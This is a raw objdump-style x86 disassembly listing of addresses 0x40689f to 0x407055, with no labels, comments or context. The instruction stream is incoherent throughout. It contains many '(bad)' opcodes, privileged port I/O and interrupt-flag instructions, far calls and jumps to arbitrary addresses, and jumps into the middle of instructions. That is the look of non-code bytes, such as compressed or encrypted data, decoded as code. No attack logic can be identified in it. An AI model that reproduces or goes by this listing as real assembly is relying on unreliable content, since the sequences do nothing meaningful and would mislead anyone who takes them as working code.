  40689f:	sub    edx,DWORD PTR [edx+0x3ded7f9d]
  4068a5:	dec    esi
  4068a6:	ins    DWORD PTR es:[edi],dx
  4068a7:	adc    esp,edi
  4068a9:	inc    ebx
  4068aa:	test   DWORD PTR [ecx+edi*2+0x70],esp
  4068ae:	xor    ecx,0xbe8263fe
  4068b4:	xchg   edx,eax
  4068b5:	and    BYTE PTR [edi-0x549839f0],0x20
  4068bc:	dec    ebp
  4068bd:	ret    
  4068be:	xchg   edx,eax
  4068bf:	xchg   ecx,eax
  4068c0:	mov    edx,0xd88ed3af
  4068c5:	cmp    ah,ch
  4068c7:	sbb    DWORD PTR [esi],eax
  4068c9:	jl     0x406917
  4068cb:	jmp    0x8466cbed
  4068d0:	shl    DWORD PTR [esi],cl
  4068d2:	ret    0x586d
  4068d5:	fxch   st(0)
  4068d7:	(bad)  
  4068d8:	rol    BYTE PTR ds:0xf5e5771e,1
  4068de:	dec    edx
  4068df:	loope  0x40693a
  4068e1:	popf   
  4068e2:	aaa    
  4068e3:	jecxz  0x406868
  4068e5:	push   esp
  4068e6:	xchg   ebp,eax
  4068e7:	lds    eax,FWORD PTR [ebp-0xbe1b585]
  4068ed:	jne    0x406958
  4068ef:	pop    ecx
  4068f0:	(bad)  
  4068f1:	mov    ebp,0xe45658b8
  4068f6:	gs in  eax,0xa3
  4068f9:	mov    ah,BYTE PTR [ebp-0x35]
  4068fc:	add    edx,DWORD PTR [edx+0x17595940]
  406902:	aas    
  406903:	iret   
  406904:	into   
  406905:	xchg   ebp,eax
  406906:	jl     0x40689a
  406908:	repnz sbb BYTE PTR [esi+0x5bc6ec4a],cl
  40690f:	dec    esp
  406910:	mov    BYTE PTR [eax-0x74],ah
  406913:	push   es
  406914:	sbb    ah,BYTE PTR [eax]
  406916:	dec    eax
  406917:	dec    edx
  406918:	inc    eax
  406919:	test   BYTE PTR [esi],bl
  40691b:	inc    eax
  40691c:	enter  0x3194,0x3f
  406920:	mov    ebx,0x6f16e5ec
  406925:	and    edi,DWORD PTR [edi+0x3410959f]
  40692b:	mov    esi,0x1d0cc413
  406930:	je     0x40699f
  406932:	shl    DWORD PTR [ebx-0x2448b6a4],cl
  406938:	outs   dx,DWORD PTR ds:[esi]
  406939:	adc    DWORD PTR [ecx-0x3007f51d],edi
  40693f:	xchg   esp,eax
  406940:	jle    0x4068dc
  406942:	out    0x1c,al
  406944:	xchg   edi,eax
  406945:	lods   al,BYTE PTR ds:[esi]
  406946:	loopne 0x406906
  406948:	push   0x83a8a49f
  40694d:	je     0x406991
  40694f:	sbb    DWORD PTR [edi+0x5b5b26fe],edi
  406955:	ret    0xb486
  406958:	std    
  406959:	nop
  40695a:	ins    BYTE PTR es:[edi],dx
  40695b:	dec    eax
  40695c:	adc    edi,esi
  40695e:	add    BYTE PTR [ebx-0x3bdf534],dl
  406964:	add    bl,BYTE PTR [ebx]
  406966:	in     al,dx
  406967:	jp     0x406910
  406969:	popa   
  40696a:	push   esi
  40696b:	push   ecx
  40696c:	repnz mov dl,0xa5
  40696f:	out    0x58,eax
  406971:	jle    0x406917
  406973:	scas   al,BYTE PTR es:[edi]
  406974:	shl    BYTE PTR [ebp+ebx*4-0x7d],0x83
  406979:	push   ebp
  40697a:	fst    QWORD PTR [edi+ebx*4+0x43]
  40697e:	mov    ebp,0x88342fbc
  406983:	xor    al,0xb2
  406985:	(bad)  
  406986:	and    al,0xbc
  406988:	mov    dl,0xc4
  40698a:	add    al,0xa6
  40698c:	cmp    BYTE PTR ds:0x59447ac8,bh
  406992:	(bad)  [edi]
  406994:	pop    ecx
  406995:	outs   dx,DWORD PTR ds:[esi]
  406996:	shr    BYTE PTR [edx],0xd8
  406999:	push   esp
  40699a:	popa   
  40699b:	inc    esi
  40699c:	push   eax
  40699d:	ins    DWORD PTR es:[edi],dx
  40699e:	jae    0x406999
  4069a0:	sub    BYTE PTR [ebx-0x26],0x5b
  4069a4:	add    eax,0xd96c5c70
  4069a9:	push   0x5e
  4069ab:	sbb    al,0x5d
  4069ad:	call   0xee39e634
  4069b2:	mov    esi,0x9ee419c0
  4069b7:	pop    ebp
  4069b8:	xor    edi,ebx
  4069ba:	pop    ebp
  4069bb:	mov    edi,0x9bc5aa9e
  4069c0:	mov    bl,0x99
  4069c2:	ret    
  4069c3:	mov    eax,DWORD PTR [edi+0x5ee3fc4]
  4069c9:	mov    esp,0x936a78fb
  4069ce:	in     eax,dx
  4069cf:	lds    ebp,FWORD PTR [edi+0x6cdb178e]
  4069d5:	out    0x4b,eax
  4069d7:	inc    edi
  4069d8:	xor    DWORD PTR [esi+0x34],ebx
  4069db:	bswap  ecx
  4069dd:	xor    eax,0x9cfc345c
  4069e2:	outs   dx,DWORD PTR ds:[esi]
  4069e3:	xchg   esi,eax
  4069e4:	mov    edi,0xd807122e
  4069e9:	in     al,dx
  4069ea:	mov    esp,ebp
  4069ec:	popa   
  4069ed:	mov    al,0x57
  4069ef:	dec    edi
  4069f0:	mov    ecx,0x8ddcb343
  4069f5:	outs   dx,DWORD PTR ds:[esi]
  4069f6:	aad    0x74
  4069f8:	sub    ecx,esp
  4069fa:	test   DWORD PTR [esi],ecx
  4069fc:	sti    
  4069fd:	movq   mm3,QWORD PTR [edi+0x3a6fc2ff]
  406a04:	cmp    al,0xd1
  406a06:	jns    0x406a54
  406a08:	neg    BYTE PTR [ebx]
  406a0a:	pop    edi
  406a0b:	mov    al,ds:0x26409897
  406a10:	test   DWORD PTR [ebp+0xc],edi
  406a13:	push   edx
  406a14:	dec    ebp
  406a15:	(bad)  [ebp-0x37a2c91f]
  406a1b:	dec    ebx
  406a1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a1d:	jl     0x406a1a
  406a1f:	push   cs
  406a20:	pop    ss
  406a21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a22:	cs iret 
  406a24:	int3   
  406a25:	test   DWORD PTR [edi-0x4e],ecx
  406a28:	mov    eax,ds:0xb1e4eb61
  406a2d:	mov    ?,WORD PTR [ecx+0x50]
  406a30:	data16 sbb bh,BYTE PTR [eax+0xb43ade8]
  406a37:	jo     0x406a68
  406a39:	scas   eax,DWORD PTR es:[edi]
  406a3a:	dec    ebx
  406a3b:	je     0x406a9c
  406a3d:	aam    0x35
  406a3f:	push   0x5010c6dd
  406a44:	mov    BYTE PTR [ebx+0x6d],al
  406a47:	int3   
  406a48:	sbb    dh,BYTE PTR [edx+ebp*2-0x76]
  406a4c:	cmp    DWORD PTR [edx-0x5],ebp
  406a4f:	rcr    BYTE PTR [eax],cl
  406a51:	jns    0x406aae
  406a53:	sub    ecx,0x53
  406a56:	push   eax
  406a57:	mov    dh,0x53
  406a59:	(bad)  
  406a5a:	mov    ebp,0x7f2787d8
  406a5f:	shl    DWORD PTR [edx+0x6],1
  406a62:	push   ss
  406a63:	xor    dh,dh
  406a65:	dec    eax
  406a66:	dec    edx
  406a67:	(bad)  
  406a68:	and    dl,BYTE PTR [ebx+esi*1-0x34]
  406a6c:	push   cs
  406a6d:	and    eax,0xfe3987f2
  406a72:	mov    dl,0x7a
  406a74:	mov    ?,WORD PTR [ecx]
  406a76:	inc    esi
  406a77:	data16 mov bh,0xb2
  406a7a:	daa    
  406a7b:	inc    ecx
  406a7c:	cmp    DWORD PTR [ecx-0x6],eax
  406a7f:	arpl   cx,dx
  406a81:	je     0x406a4f
  406a83:	push   esp
  406a84:	jb     0x406a33
  406a86:	out    0xbc,al
  406a88:	scas   eax,DWORD PTR es:[edi]
  406a89:	pusha  
  406a8a:	mov    ebp,0x68a70c0a
  406a8f:	inc    edx
  406a90:	cmp    DWORD PTR [ecx],edi
  406a92:	sub    eax,0xc3dbed98
  406a97:	ss mov ah,0xb
  406a9a:	sub    ebx,DWORD PTR [ebp+ebx*8-0x1aa735eb]
  406aa1:	movups xmm3,XMMWORD PTR [edi+esi*8-0x80c1aac]
  406aa9:	rol    DWORD PTR [ecx-0x26],1
  406aac:	add    DWORD PTR [edi],ebp
  406aae:	sbb    eax,0x510f4fcb
  406ab3:	inc    ebp
  406ab4:	shl    ch,cl
  406ab6:	xor    bl,BYTE PTR [edx+0x62fde7e]
  406abc:	jmp    0x2fa00ed5
  406ac1:	ret    0x263f
  406ac4:	jns    0x406b26
  406ac6:	sti    
  406ac7:	mov    BYTE PTR [ecx+0x5c],cl
  406aca:	shl    BYTE PTR [edx-0x4c6bcde],0x1e
  406ad1:	mov    dl,0x5e
  406ad3:	adc    al,0x84
  406ad5:	xchg   ebx,eax
  406ad6:	int3   
  406ad7:	cmp    al,0x4a
  406ad9:	add    al,0x49
  406adb:	mov    ebx,0x1f43a0d6
  406ae0:	je     0x406aa2
  406ae2:	inc    esp
  406ae3:	neg    BYTE PTR [edi-0x20aa17be]
  406ae9:	lahf   
  406aea:	mov    dx,0xfaaa
  406aee:	jae    0x406b27
  406af0:	and    DWORD PTR [ecx+ebp*1-0x59e87228],edx
  406af7:	repnz inc ebx
  406af9:	hlt    
  406afa:	and    ebx,ebx
  406afc:	imul   esp,DWORD PTR [ebx-0x7ef19a55],0x5fdfeea0
  406b06:	jge    0x406adb
  406b08:	std    
  406b09:	mov    eax,0xce950445
  406b0e:	sti    
  406b0f:	mov    eax,ds:0x5336b1d0
  406b14:	fadd   QWORD PTR [esi]
  406b16:	push   0x6e
  406b18:	adc    dl,dh
  406b1a:	jae    0x406ae0
  406b1c:	test   al,0x39
  406b1e:	les    ecx,FWORD PTR [ebp-0x37]
  406b21:	jg     0x406b75
  406b23:	pop    esp
  406b24:	push   edx
  406b25:	dec    esi
  406b26:	mov    edx,0x2b35a64e
  406b2b:	and    ch,BYTE PTR [ebx+0x2d]
  406b2e:	les    ecx,FWORD PTR [edx-0xa726973]
  406b34:	or     DWORD PTR ds:0x86ca664a,esp
  406b3a:	dec    edx
  406b3b:	jo     0x406b11
  406b3d:	mov    edx,0x16565f44
  406b42:	adc    BYTE PTR [esi],bl
  406b44:	stos   DWORD PTR es:[edi],eax
  406b45:	stc    
  406b46:	leave  
  406b47:	fsubr  st,st(5)
  406b49:	(bad)  
  406b4a:	push   ebp
  406b4b:	div    DWORD PTR [edx]
  406b4d:	jp     0x406bb5
  406b4f:	sbb    BYTE PTR [edx-0x3f],bl
  406b52:	pop    esp
  406b53:	ins    BYTE PTR es:[edi],dx
  406b54:	xchg   edi,eax
  406b55:	call   0x1cbd:0xeb5be0cb
  406b5c:	dec    edx
  406b5d:	test   al,0x9f
  406b5f:	push   0x7b2c17dd
  406b64:	cdq    
  406b65:	push   eax
  406b66:	lea    eax,[ecx]
  406b68:	cs cmp DWORD PTR fs:[edi+0x5808ce76],eax
  406b70:	xlat   BYTE PTR ds:[ebx]
  406b71:	cmc    
  406b72:	hlt    
  406b73:	call   0xd865f333
  406b78:	arpl   WORD PTR cs:[edx+0x2b4f6e84],si
  406b7f:	fldenv [edi+0x63e6ba71]
  406b85:	popf   
  406b86:	jle    0x406b10
  406b88:	dec    esi
  406b89:	nop
  406b8a:	rol    al,0x4f
  406b8d:	les    ebp,FWORD PTR [esi]
  406b8f:	push   0xf4aeb116
  406b94:	data16 or cl,bl
  406b97:	inc    edi
  406b98:	sub    al,0x6b
  406b9a:	adc    al,0x57
  406b9c:	cwde   
  406b9d:	(bad)  
  406b9e:	push   edx
  406b9f:	xchg   ebx,eax
  406ba0:	mov    ebx,0x5dbc0e6d
  406ba5:	popf   
  406ba6:	sbb    dh,BYTE PTR [ecx-0x6bde8c47]
  406bac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406bad:	dec    edi
  406bae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406baf:	int3   
  406bb0:	(bad)  [ebx+0x5e]
  406bb3:	mov    eax,ds:0x392a356c
  406bb8:	sbb    DWORD PTR [ecx],esp
  406bba:	data16 or BYTE PTR [ebp-0x6d678906],dl
  406bc1:	das    
  406bc2:	pop    ebp
  406bc3:	push   ecx
  406bc4:	or     ebp,esi
  406bc6:	(bad)  
  406bc7:	pop    eax
  406bc8:	cli    
  406bc9:	dec    esp
  406bca:	fsubr  QWORD PTR [ecx+0x5c3a2f90]
  406bd0:	jg     0x406b86
  406bd2:	xchg   edi,eax
  406bd3:	or     BYTE PTR [eax+0x45],dl
  406bd6:	jnp    0x406c48
  406bd8:	jmp    0x146543b8
  406bdd:	sbb    al,0xc6
  406bdf:	and    ecx,esp
  406be1:	mov    eax,ds:0xa7e8e239
  406be6:	sbb    edx,esi
  406be8:	mov    ebp,0xa92cacf
  406bed:	dec    esi
  406bee:	adc    ebx,DWORD PTR [ebp+0x5]
  406bf1:	stos   DWORD PTR es:[edi],eax
  406bf2:	and    bl,BYTE PTR [ebx-0x2]
  406bf5:	and    al,0x3c
  406bf7:	or     bl,cl
  406bf9:	mov    bh,0xd0
  406bfb:	cs retf 0x5c5d
  406bff:	sbb    ah,BYTE PTR [ecx+0x50]
  406c02:	idiv   BYTE PTR [eax+0x57]
  406c05:	or     BYTE PTR [esi],bl
  406c07:	sbb    al,BYTE PTR [edx+0x77e87023]
  406c0d:	fwait
  406c0e:	test   eax,0xded64450
  406c13:	popa   
  406c14:	scas   eax,DWORD PTR es:[edi]
  406c15:	xor    eax,0x24bf6317
  406c1a:	xchg   bp,ax
  406c1c:	test   BYTE PTR [ebx-0x6a489e2f],0xb0
  406c23:	in     eax,0x0
  406c25:	mov    edx,0xb9ae09d4
  406c2a:	or     dl,BYTE PTR [ebp-0x25]
  406c2d:	add    esp,esi
  406c2f:	xor    eax,0xe1aa7bf9
  406c34:	or     al,0xf6
  406c36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c38:	test   DWORD PTR [esi+0x13f1f450],ecx
  406c3e:	xlat   BYTE PTR ds:[ebx]
  406c3f:	lods   al,BYTE PTR ds:[esi]
  406c40:	(bad)  
  406c41:	xchg   ebx,eax
  406c42:	mov    ebp,0xa0453ef
  406c47:	aad    0x38
  406c49:	add    dl,BYTE PTR [edx+ebx*8-0x6cf5f81b]
  406c50:	sbb    al,0x5c
  406c52:	inc    edi
  406c53:	fist   WORD PTR [ebx-0x22]
  406c56:	imul   esi,DWORD PTR [edi+0x48f53292],0xffffff99
  406c5d:	and    eax,0x69c2c620
  406c62:	lds    edx,FWORD PTR [esp+ebx*1-0x7b3f8bb9]
  406c69:	push   cs
  406c6a:	es aas 
  406c6c:	adc    esp,esi
  406c6e:	outs   dx,BYTE PTR ds:[esi]
  406c6f:	dec    ecx
  406c70:	sub    DWORD PTR [ebx-0x51],0xffffffdb
  406c74:	lahf   
  406c75:	xchg   edx,eax
  406c76:	into   
  406c77:	inc    ebx
  406c78:	retf   0xe1e6
  406c7b:	loop   0x406ccf
  406c7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c7e:	jl     0x406c2e
  406c80:	lock sbb bx,WORD PTR [esi+0x2f46461d]
  406c88:	lea    ecx,[esi+0x40]
  406c8b:	xchg   esp,eax
  406c8c:	icebp  
  406c8d:	call   0xd58c:0xde4258f5
  406c94:	sbb    BYTE PTR ds:0x73fef33b,al
  406c9a:	aaa    
  406c9b:	test   BYTE PTR [esi-0x52e01f4c],cl
  406ca1:	sub    BYTE PTR [edi+eiz*4],dh
  406ca4:	fwait
  406ca5:	xchg   BYTE PTR [esi+0x20],cl
  406ca8:	lfs    edi,FWORD PTR cs:[eax]
  406cac:	or     edi,DWORD PTR [ecx]
  406cae:	imul   DWORD PTR [eax-0x1adbdfcf]
  406cb4:	push   ss
  406cb5:	jg     0x406cac
  406cb7:	dec    ecx
  406cb8:	cmp    DWORD PTR [ebx+0x7a8a8ecd],edi
  406cbe:	xchg   ecx,eax
  406cbf:	neg    DWORD PTR [ebp-0x7f535e2b]
  406cc5:	sub    eax,DWORD PTR [ebp+0x49a06003]
  406ccb:	dec    edx
  406ccc:	mov    ch,0x86
  406cce:	xchg   ecx,eax
  406ccf:	mov    ch,0x22
  406cd1:	adc    al,0xb
  406cd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cd4:	out    dx,eax
  406cd5:	jmp    0x3605:0x36e5ad1
  406cdc:	mov    eax,0x656cc55b
  406ce1:	iret   
  406ce2:	and    al,0xd9
  406ce4:	cmp    al,BYTE PTR [eax+esi*4]
  406ce7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ce8:	in     eax,0xa3
  406cea:	push   ds
  406ceb:	out    0xf8,al
  406ced:	adc    BYTE PTR [edi+0xe],ah
  406cf0:	retf   0xc921
  406cf3:	xchg   edi,eax
  406cf4:	mov    DWORD PTR [edx+0x3979bb76],esi
  406cfa:	sbb    BYTE PTR [esi+edx*8],bl
  406cfd:	retf   
  406cfe:	sub    eax,0x90cc8a5a
  406d03:	mov    fs,esi
  406d05:	popf   
  406d06:	pop    eax
  406d07:	out    dx,eax
  406d08:	mov    ds:0xb52e9791,eax
  406d0d:	jnp    0x406cc8
  406d0f:	retf   
  406d10:	pop    eax
  406d11:	cdq    
  406d12:	pop    eax
  406d13:	sub    al,0xf7
  406d15:	push   0x44c82bcf
  406d1a:	push   ebp
  406d1b:	loope  0x406cd5
  406d1d:	les    ecx,FWORD PTR [edi+0x1a]
  406d20:	retf   
  406d21:	test   al,0x38
  406d23:	fwait
  406d24:	rol    DWORD PTR [ecx],cl
  406d26:	les    eax,FWORD PTR [esi]
  406d28:	mov    gs,WORD PTR [eax-0x16]
  406d2b:	mov    al,0x64
  406d2d:	inc    esi
  406d2e:	call   0x9a891e27
  406d33:	dec    ebx
  406d34:	cmc    
  406d35:	test   al,0x85
  406d37:	mov    eax,0x1c7f0eb6
  406d3c:	inc    ebx
  406d3d:	sbb    BYTE PTR [edx+ecx*2+0x3eefbd58],ah
  406d44:	fisubr DWORD PTR [ebp-0x5e]
  406d47:	sub    dl,dh
  406d49:	call   eax
  406d4b:	push   edi
  406d4c:	daa    
  406d4d:	mov    bh,0x9c
  406d4f:	jmp    0x406d74
  406d51:	icebp  
  406d52:	or     al,0x93
  406d54:	adc    DWORD PTR [edi-0x30],edx
  406d57:	adc    al,0xf6
  406d59:	mov    dh,BYTE PTR [edi+0x31baa70d]
  406d5f:	mov    ah,0xd1
  406d61:	fdivrp st(5),st
  406d63:	bound  esp,QWORD PTR ds:0x8bfff08f
  406d69:	ror    BYTE PTR ds:0x90b0de9a,cl
  406d6f:	into   
  406d70:	add    esp,DWORD PTR [ebx-0x41]
  406d73:	mov    edx,0x3471446f
  406d78:	mov    WORD PTR [edi],gs
  406d7a:	mov    ecx,DWORD PTR [edi+0x5b]
  406d7d:	and    bh,BYTE PTR [ecx+0x4f28e738]
  406d83:	add    esi,edi
  406d85:	pushf  
  406d86:	add    bl,BYTE PTR [edx-0x35477319]
  406d8c:	mov    esp,0x402d803b
  406d91:	cmc    
  406d92:	cmp    dl,BYTE PTR [esi-0x6d226f34]
  406d98:	pop    esi
  406d99:	cmp    DWORD PTR [eax-0x7a],esi
  406d9c:	mov    ecx,0x8df029d3
  406da1:	pop    ebp
  406da2:	das    
  406da3:	lds    ebp,FWORD PTR [edi]
  406da5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406da6:	sbb    eax,0x2a66a904
  406dab:	add    eax,0x77a41e02
  406db0:	and    al,0xf8
  406db2:	fadd   QWORD PTR [ebx]
  406db4:	inc    edx
  406db5:	mov    BYTE PTR [eax-0x2d76dca9],cl
  406dbb:	adc    eax,0x90e65b40
  406dc0:	xor    DWORD PTR [ebx+0xf],eax
  406dc3:	in     al,0x5c
  406dc5:	fmul   st(3),st
  406dc7:	shr    BYTE PTR [eax+0x42],0x83
  406dcb:	pushfw 
  406dcd:	int3   
  406dce:	inc    esp
  406dcf:	or     dh,BYTE PTR [ebx+0x15]
  406dd2:	out    dx,eax
  406dd3:	int    0xaa
  406dd5:	pushf  
  406dd6:	call   0x80a5:0x7091c39
  406ddd:	add    eax,0x672a4be6
  406de2:	and    BYTE PTR [ecx+0x3e6728d0],ah
  406de8:	jo     0x406e3c
  406dea:	pop    esi
  406deb:	call   0x44f71c69
  406df0:	inc    esp
  406df1:	mov    ch,0x83
  406df3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406df4:	inc    edi
  406df5:	push   esp
  406df7:	adc    eax,DWORD PTR [ebx+0x1f]
  406dfa:	inc    ecx
  406dfb:	adc    ch,BYTE PTR [ebx-0x4f]
  406dfe:	xchg   edx,eax
  406dff:	les    ecx,FWORD PTR [edi+ecx*1-0x70]
  406e03:	mov    ds,WORD PTR [edi+0x6878e306]
  406e09:	lock xchg BYTE PTR [bp+di+0x576e],ah
  406e0f:	fld    DWORD PTR es:[ebx+0x3634392a]
  406e16:	out    dx,al
  406e17:	fidivr DWORD PTR [esi+0x14]
  406e1a:	push   ds
  406e1b:	or     al,0x7d
  406e1d:	int3   
  406e1e:	arpl   WORD PTR [esi+0x6b],ax
  406e21:	jg     0x406ded
  406e23:	adc    BYTE PTR fs:[edx],dh
  406e26:	aad    0xd3
  406e28:	push   ss
  406e29:	dec    eax
  406e2a:	fsubr  QWORD PTR [ebp+0x4a]
  406e2d:	es fwait
  406e2f:	(bad)  
  406e32:	hlt    
  406e33:	(bad)  
  406e34:	add    al,0x7f
  406e36:	xchg   ebp,eax
  406e37:	jbe    0x406e24
  406e39:	sub    eax,0xc7914e69
  406e3e:	popf   
  406e3f:	inc    ebp
  406e40:	inc    esp
  406e41:	adc    eax,ebp
  406e43:	xchg   ebp,eax
  406e44:	push   cs
  406e45:	sub    edx,esi
  406e47:	(bad)  
  406e48:	cmp    dl,BYTE PTR [eax-0x56f71d05]
  406e4e:	mov    bh,0x5e
  406e50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e53:	mov    BYTE PTR [ebx],dh
  406e55:	dec    ebp
  406e56:	shl    ecx,0x72
  406e59:	adc    al,BYTE PTR [ebx]
  406e5b:	(bad)  
  406e5c:	cmp    al,0x21
  406e5e:	or     ecx,DWORD PTR [esi-0x29124fa4]
  406e64:	lods   al,BYTE PTR ds:[esi]
  406e65:	push   ecx
  406e66:	inc    ebx
  406e67:	cmp    DWORD PTR [esi],eax
  406e69:	or     edx,DWORD PTR [ebx-0x1d5d91cc]
  406e6f:	sub    ah,BYTE PTR [esi]
  406e71:	fidivr DWORD PTR [ecx+0x2f]
  406e74:	mov    al,0x11
  406e76:	test   eax,0xa493ae93
  406e7b:	cmp    bl,BYTE PTR [edx]
  406e7d:	mov    edx,0x11b47447
  406e82:	push   ebx
  406e83:	loopne 0x406edc
  406e85:	lods   eax,DWORD PTR ds:[esi]
  406e86:	push   ds
  406e87:	call   0xb90c:0xf9e7d354
  406e8e:	dec    edx
  406e8f:	jne    0x406eff
  406e91:	cli    
  406e92:	repnz hlt 
  406e94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e95:	cdq    
  406e96:	xchg   esp,eax
  406e97:	adc    ah,BYTE PTR [eax+0x41]
  406e9a:	test   BYTE PTR cs:[esi],dl
  406e9d:	std    
  406e9e:	inc    esi
  406e9f:	bound  edi,QWORD PTR [edx]
  406ea1:	push   0x7c5c3b9d
  406ea6:	pop    ecx
  406ea7:	dec    eax
  406ea8:	add    eax,0x9ce195ac
  406ead:	cmp    BYTE PTR [eax+0x1119c843],dh
  406eb3:	iret   
  406eb4:	jb     0x406eb5
  406eb6:	or     BYTE PTR [ecx-0x46043e8e],ch
  406ebc:	cdq    
  406ebd:	jb     0x406e65
  406ebf:	pop    ds
  406ec0:	arpl   WORD PTR [edx+0x3db0ed64],ax
  406ec6:	fdivr  st,st(5)
  406ec8:	mov    dh,0xc2
  406eca:	stc    
  406ecb:	test   DWORD PTR [ebp-0x4cb199b7],edi
  406ed1:	idiv   BYTE PTR [ebx]
  406ed3:	pop    esi
  406ed4:	cmp    eax,0x60f59895
  406ed9:	adc    al,0xdf
  406edb:	cmp    eax,0x7c411e52
  406ee0:	retf   
  406ee1:	in     eax,dx
  406ee2:	xchg   edi,eax
  406ee3:	and    al,0x8
  406ee5:	jae    0x406f04
  406ee7:	adc    DWORD PTR ds:0xb2d6290a,edx
  406eed:	add    eax,0x6b7f9073
  406ef2:	inc    ebp
  406ef3:	std    
  406ef4:	and    BYTE PTR [edx+0x78],al
  406ef7:	shr    BYTE PTR [edi],0x25
  406efa:	xchg   esp,eax
  406efb:	jnp    0x406f31
  406efd:	inc    ebp
  406efe:	dec    ecx
  406eff:	sub    DWORD PTR [esi],ebx
  406f01:	cli    
  406f02:	push   eax
  406f03:	pop    ebx
  406f04:	into   
  406f05:	imul   ebp,DWORD PTR [edi-0x64],0x8ff22a6a
  406f0c:	gs mov ebx,0x30eca0c3
  406f12:	inc    esi
  406f13:	lahf   
  406f14:	addr16 push ecx
  406f16:	xchg   edx,eax
  406f17:	mov    WORD PTR [ebp+0x4e],?
  406f1a:	arpl   WORD PTR [ebx+ecx*1-0x46],ax
  406f1e:	jp     0x406f40
  406f20:	out    dx,eax
  406f21:	xor    ebp,DWORD PTR [edi]
  406f23:	lods   eax,DWORD PTR ds:[esi]
  406f24:	jg     0x406f21
  406f26:	stos   BYTE PTR es:[edi],al
  406f27:	push   0xffffffc3
  406f29:	jb     0x406f20
  406f2b:	mov    bl,0xfc
  406f2d:	jle    0x406f91
  406f2f:	push   esi
  406f30:	pop    edi
  406f31:	je     0x406fa9
  406f33:	(bad)  [edx+0x5e2e99cb]
  406f39:	test   BYTE PTR [ebp+ebx*8-0x7240fd0b],ah
  406f40:	in     al,0x26
  406f42:	repz shl BYTE PTR [ecx],1
  406f45:	xor    bh,ah
  406f47:	jbe    0x406eee
  406f49:	add    eax,0xaef3e4dd
  406f4e:	mov    dh,0x66
  406f50:	icebp  
  406f51:	inc    esi
  406f52:	out    0xd7,eax
  406f54:	in     al,0xfb
  406f56:	rcr    ebx,cl
  406f58:	jne    0x406ee9
  406f5a:	cli    
  406f5b:	bswap  ecx
  406f5d:	cwde   
  406f5e:	or     DWORD PTR [edx+0x41a6b834],ebx
  406f64:	sbb    esi,ebp
  406f66:	imul   eax,DWORD PTR [eax+0x732571a],0x59
  406f6d:	ds jbe 0x406f18
  406f70:	retf   0x99fd
  406f73:	pop    es
  406f74:	jne    0x406f80
  406f76:	xchg   esp,eax
  406f77:	xor    eax,0x333ed564
  406f7c:	xor    bl,bh
  406f7e:	or     BYTE PTR [ebp+0x331cbe60],ch
  406f84:	pop    ecx
  406f85:	sbb    BYTE PTR [ebx],0x2e
  406f88:	mov    ds:0x85ffc2f3,al
  406f8d:	xchg   DWORD PTR [ebp+0x160957c],esp
  406f93:	cdq    
  406f94:	push   edx
  406f95:	popf   
  406f96:	pusha  
  406f97:	or     al,0xec
  406f99:	mov    eax,0x35d515cc
  406f9e:	mov    edi,0xfa38b54
  406fa3:	fnstsw WORD PTR [edx]
  406fa5:	fs ins BYTE PTR es:[edi],dx
  406fa7:	jmp    0x406f42
  406fa9:	imul   esi,DWORD PTR [edx],0x9fb6b570
  406faf:	test   DWORD PTR [edx-0x6e70fddd],edi
  406fb5:	adc    al,0x61
  406fb7:	(bad)  
  406fb8:	jns    0x407003
  406fba:	xor    bl,BYTE PTR [ebp+0x1f]
  406fbd:	xor    ah,BYTE PTR [ecx]
  406fbf:	mov    eax,eax
  406fc1:	xchg   esi,eax
  406fc2:	js     0x406f9e
  406fc4:	dec    esp
  406fc5:	sub    al,0x58
  406fc7:	add    dl,bl
  406fc9:	dec    edi
  406fca:	mov    ecx,0x58e75889
  406fcf:	inc    esp
  406fd0:	retf   
  406fd1:	lods   al,BYTE PTR ds:[esi]
  406fd2:	test   al,0x11
  406fd4:	inc    ebx
  406fd5:	add    BYTE PTR [eax-0x1c],0x1a
  406fd9:	jns    0x407023
  406fdb:	jbe    0x406fa7
  406fdd:	xchg   edi,eax
  406fde:	cmp    al,al
  406fe0:	xor    eax,0xc1fe472d
  406fe5:	xor    bl,BYTE PTR [ebp+0x2bf23336]
  406feb:	pop    esi
  406fec:	std    
  406fed:	(bad)  
  406fee:	aad    0xb6
  406ff0:	sbb    DWORD PTR [edi+eax*8-0x6d7f28a3],ebx
  406ff7:	xchg   ebx,eax
  406ff8:	sub    bl,dl
  406ffa:	or     al,0x71
  406ffc:	out    dx,al
  406ffd:	ret    
  406ffe:	and    al,ah
  407000:	cli    
  407001:	sbb    DWORD PTR [eax],ebx
  407003:	adc    ah,ah
  407005:	cld    
  407006:	stc    
  407007:	inc    ecx
  407008:	std    
  407009:	add    DWORD PTR [edx+0x72],esp
  40700c:	shl    DWORD PTR ds:0x3cde4ae2,cl
  407012:	ja     0x406fc1
  407014:	jb     0x40700e
  407016:	icebp  
  407017:	mov    edi,0xb1e9a128
  40701c:	push   ebx
  40701d:	add    eax,0xebd3ee4
  407022:	(bad)  
  407023:	mov    ds:0x450fc5c1,eax
  407028:	cld    
  407029:	mov    ch,0x3b
  40702b:	dec    esi
  40702c:	cs aaa 
  40702e:	mov    cl,0xaf
  407030:	mov    eax,ds:0x944b9a3b
  407035:	mov    eax,0xb3b501d9
  40703a:	inc    esi
  40703b:	daa    
  40703c:	mov    WORD PTR [ebx-0x44],ds
  40703f:	loope  0x40708a
  407041:	jbe    0x40701e
  407043:	adc    ebp,0x4d
  407046:	jmp    0x40707b
  407048:	ds xor al,dl
  40704b:	inc    edi
  40704c:	push   edx
  40704d:	dec    edi
  40704e:	push   eax
  40704f:	test   ebp,edi
  407051:	cwde   
  407052:	sti    
  407053:	mov    cl,0xa8
  407055:	gs repnz add al,0xcd
